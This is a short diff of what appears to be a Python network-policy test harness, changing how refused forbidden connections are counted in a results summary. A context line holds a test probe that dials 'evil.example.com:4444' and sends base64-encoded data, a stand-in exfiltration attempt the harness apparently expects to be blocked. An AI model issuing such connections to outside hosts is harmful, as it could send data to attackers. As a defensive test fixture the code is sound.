@@ -91,7 +91,7 @@ def main() -> None:
         f"DIAL evil.example.com:4444\nSEND {base64.b64encode(b'x').decode()}\n")
     result = summarise(rounds=ROUNDS, integrity_ok=integrity_ok,
                        refused_or_invalid=refused, rtts=rtts,
-                       forbidden_refused=forbidden.refused,
+                       forbidden_refused=acl.violations,
                        executor_stats=executor.stats())
     write_evidence(result, Path("research/runs/native-tcp-cross-20260920.json"),
                    __file__, subject=SUBJECT)
